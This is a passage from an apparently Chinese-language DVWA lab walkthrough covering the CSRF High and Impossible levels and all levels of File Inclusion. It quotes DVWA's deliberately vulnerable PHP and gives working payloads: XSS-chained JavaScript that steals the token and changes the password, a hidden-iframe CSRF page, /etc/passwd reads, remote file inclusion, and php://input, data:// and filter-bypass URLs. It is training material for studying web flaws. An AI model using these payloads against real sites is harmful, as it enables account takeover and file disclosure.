<span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>)); </span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database </span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>; </span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>可以看到，High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
<p>这一关思路是使用 XSS 来获取用户的 token ，然后将 token 放到 CSRF 的请求中。因为 HTML 无法跨域，这里我们尽量使用原生的 JS 发起 HTTP 请求才可以。下面是配合 DVWA DOM XSS High 来解题的。</p>
<h4 id="1、JS-发起-HTTP-CSRF-请求"><a href="#1、JS-发起-HTTP-CSRF-请求" class="headerlink" title="1、JS 发起 HTTP CSRF 请求"></a>1、JS 发起 HTTP CSRF 请求</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先访问csrf页面获取token</span></span><br><span class="line"><span class="keyword">var</span> tokenUrl = <span class="string">&#x27;http://127.0.0.1/vulnerabilities/csrf/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest)&#123;</span><br><span class="line">    xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(xmlhttp.readyState === <span class="number">4</span> &amp;&amp; xmlhttp.status === <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="comment">//使用正则提取 token</span></span><br><span class="line">        <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">        <span class="keyword">var</span> regex = <span class="regexp">/user_token\&#x27; value\=\&#x27;(.*?)\&#x27; \/\&gt;/</span>;</span><br><span class="line">        <span class="keyword">var</span> match = text.match(regex);</span><br><span class="line">        <span class="keyword">var</span> token = match[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//发起 CSRF 请求将 token 带入</span></span><br><span class="line">        <span class="keyword">var</span> new_url = <span class="string">&#x27;http://127.0.0.1/vulnerabilities/csrf/?user_token=&#x27;</span>+token+<span class="string">&#x27;&amp;password_new=111&amp;password_conf=111&amp;Change=Change#&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (count === <span class="number">0</span>)&#123;</span><br><span class="line">            count++;</span><br><span class="line">            xmlhttp.open(<span class="string">&quot;GET&quot;</span>,new_url,<span class="literal">false</span>);</span><br><span class="line">            xmlhttp.send();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.open(<span class="string">&quot;GET&quot;</span>,tokenUrl,<span class="literal">false</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>
<p>XMLHttpRequest 对象用于在后台与服务器交换数据。创建 XMLHttpRequest 对象的语法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br></pre></td></tr></table></figure>
<p>老版本的 Internet Explorer （IE5 和 IE6）使用 ActiveX 对象：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">XMLHttpRequest.open(method, url, async);</span><br></pre></td></tr></table></figure>
<p>method：要使用的HTTP方法，比如「GET」、「POST」、「PUT」、「DELETE」、等。对于非HTTP(S) URL被忽略。</p>
<p>url：一个DOMString表示要向其发送请求的URL。</p>
<p>async（可选）：一个可选的布尔参数，表示是否异步执行操作，默认为<code>true</code>。如果值为<code>false</code>，<code>send()</code>方法直到收到答复前不会返回。如果<code>true</code>，已完成事务的通知可供事件监听器使用。如果<code>multipart</code>属性为<code>true</code>则这个必须为<code>true</code>，否则将引发异常。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">XMLHttpRequest.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br></pre></td></tr></table></figure>
<p>只要 <code>readyState</code> 属性发生变化，就会调用相应的处理函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">XMLHttpRequest.send()</span><br></pre></td></tr></table></figure>
<p> 方法用于发送 HTTP 请求。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">XMLHttpRequest.withCredentials</span><br></pre></td></tr></table></figure>
<p>一个布尔值，用来指定跨域 <code>Access-Control</code> 请求是否应当带有授权信息，如 cookie 或授权 header 头。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stringObject.match(regexp)</span><br></pre></td></tr></table></figure>
<p>match() 方法可在字符串内检索指定的值，或找到一个或多个正则表达式的匹配。返回一个存放匹配结果的数组。</p>
<p>将这个CSRF.js上传到服务器上，此时的URL为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;CSRF.js</span><br></pre></td></tr></table></figure>
<p>然后此时访问 DVWA DOM XSS 的 High 级别，直接发起 XSS 测试（后面 XSS 会详细来讲解）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;English&amp;a&#x3D;&lt;&#x2F;option&gt;&lt;&#x2F;select&gt;&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:81&#x2F;CSRF.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>这里直接通过 script 标签的 src 来引入外部 js，访问之后此时密码就被更改为 111 了</p>
<h4 id="2、常规思路-HTML-发起-CSRF-请求"><a href="#2、常规思路-HTML-发起-CSRF-请求" class="headerlink" title="2、常规思路 HTML 发起 CSRF 请求"></a>2、常规思路 HTML 发起 CSRF 请求</h4><p>假设攻击者这里可以将 HTML 保存上传到 CORS 的跨域白名单下的话，那么这里也可以通过 HTML 这种组合式的 CSRF 攻击。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> token = <span class="built_in">document</span>.getElementById(<span class="string">&quot;get_token&quot;</span>).contentWindow.document.getElementsByName(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].value</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementsByClassName(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].value = token;</span></span><br><span class="line">        alert(token);</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;csrf&quot;</span>).submit();</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/vulenrabilities/csrf/&quot;</span> <span class="attr">id</span>=<span class="string">&quot;get_token&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onload</span>=<span class="string">&quot;attack()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/vulenrabilities/csrf/&quot;</span> <span class="attr">id</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Change&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Change&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$pass_curr</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_current&#x27;</span> ]; </span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ]; </span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise current password input </span></span><br><span class="line">    <span class="variable">$pass_curr</span> = stripslashes( <span class="variable">$pass_curr</span> ); </span><br><span class="line">    <span class="variable">$pass_curr</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_curr</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>)); </span><br><span class="line">    <span class="variable">$pass_curr</span> = md5( <span class="variable">$pass_curr</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the current password is correct </span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> ); </span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_curr</span>, PDO::PARAM_STR ); </span><br><span class="line">    <span class="variable">$data</span>-&gt;execute(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do both new passwords match and does the current password match the user? </span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &amp;&amp; ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// It does! </span></span><br><span class="line">        <span class="variable">$pass_new</span> = stripslashes( <span class="variable">$pass_new</span> ); </span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>)); </span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database with new password </span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_new</span>, PDO::PARAM_STR ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>在impossible难度下，不仅加入了token验证，而且需要用户输入当前密码才能修改密码，攻击者在不知道当前密码的情况下就无法进行CSRF攻击，另外常见的防护方法还有加验证码来防护。</p>
<h2 id="File-Inclusion-文件包含"><a href="#File-Inclusion-文件包含" class="headerlink" title="File Inclusion 文件包含"></a>File Inclusion 文件包含</h2><h3 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>low难度下对用get方法传递的page参数没有做任何过滤，因此可以直接构造page参数进行攻击：</p>
<h4 id="1、文件读取"><a href="#1、文件读取" class="headerlink" title="1、文件读取"></a>1、文件读取</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224154327894.png" alt="image-20210224154327894"></p>
<h4 id="2、远程文件包含"><a href="#2、远程文件包含" class="headerlink" title="2、远程文件包含"></a>2、远程文件包含</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224154307629.png" alt="image-20210224154307629"></p>
<h4 id="3、本地文件包含-getshell"><a href="#3、本地文件包含-getshell" class="headerlink" title="3、本地文件包含 getshell"></a>3、本地文件包含 getshell</h4><p>首先新建一个 info.txt 文件，内容如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在文件上传漏洞处上传 info.txt：这里直接给出了上传的目录</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224153829254.png" alt="image-20210224153829254"></p>
<p>然后直接构造URL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;..&#x2F;..&#x2F;hackable&#x2F;uploads&#x2F;info.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224154219905.png" alt="image-20210224154219905"></p>
<h4 id="4、远程文件包含-getshell"><a href="#4、远程文件包含-getshell" class="headerlink" title="4、远程文件包含 getshell"></a>4、远程文件包含 getshell</h4><p>同样我们可以把 info.txt文件上传到服务器上，构造URL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;http:&#x2F;&#x2F;127.0.01:81&#x2F;dvwa&#x2F;info.txt</span><br></pre></td></tr></table></figure>
<p>试了在phpstudy上搭建的服务器好像没用，原因不明；之后在虚拟机ubuntu上使用有效</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224161842321.png" alt="image-20210224161842321"></p>
<h4 id="5、伪协议"><a href="#5、伪协议" class="headerlink" title="5、伪协议"></a>5、伪协议</h4><ul>
<li>php://filter 文件读取</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;fi&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br><span class="line">&#x2F;fi&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
<p>此时会拿到 base64 加密的字符串，解密的话就可以拿到 index.php 的源码</p>
<ul>
<li>php://input getshell</li>
</ul>
<p>POST 内容可以直接写 shell ，内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;info.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224164951951.png" alt="image-20210224164951951"></p>
<p>然后会在当前目录下写入一个木马，直接访问看看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;info.php</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>无法实现，原因不明</strong></p>
</blockquote>
<ul>
<li>data:// 伪协议</li>
</ul>
<p>数据封装器，和 php:// 相似，可以直接执行任意 PHP 代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;fi&#x2F;?page&#x3D;data:text&#x2F;plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">&#x2F;fi&#x2F;?page&#x3D;data:text&#x2F;plain;base64, PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224165552686.png" alt="image-20210224165552686"></p>
<h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>medium难度下把传进来的page参数中的<code>http://</code>, <code>https://</code>, <code>../</code>, <code>..&quot;</code> 全部替换为空字符，以下为绕过方法：</p>
<h4 id="1、远程文件包含"><a href="#1、远程文件包含" class="headerlink" title="1、远程文件包含"></a>1、远程文件包含</h4><ul>
<li>双写绕过</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;fi&#x2F;?page&#x3D;htthttp:&#x2F;&#x2F;p:&#x2F;&#x2F;127.0.01:81&#x2F;dvwa&#x2F;info.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224170947403.png" alt="image-20210224170947403"></p>
<ul>
<li>大小写绕过</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;fi&#x2F;?page&#x3D;HTTP:&#x2F;&#x2F;127.0.01:81&#x2F;dvwa&#x2F;info.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224171432419.png" alt="image-20210224171432419"></p>
<h4 id="2、本地文件包含"><a href="#2、本地文件包含" class="headerlink" title="2、本地文件包含"></a>2、本地文件包含</h4><ul>
<li>双写绕过</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;fi&#x2F;?page&#x3D;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224172210696.png" alt="image-20210224172210696"></p>
<ul>
<li>假如知道绝对路径的话就无需绕过</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;fi&#x2F;?page&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>


<h3 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>high难度要求page参数必须要字符串 <code>file</code> 开头，或者是 <code>include.php</code> ，否则就退出</p>
<p>这里我们只能使用 <code>file://</code> 伪协议来绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224172903594.png" alt="image-20210224172903594"></p>
<h3 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>impossible难度直接使用白名单的方法，无解</p>
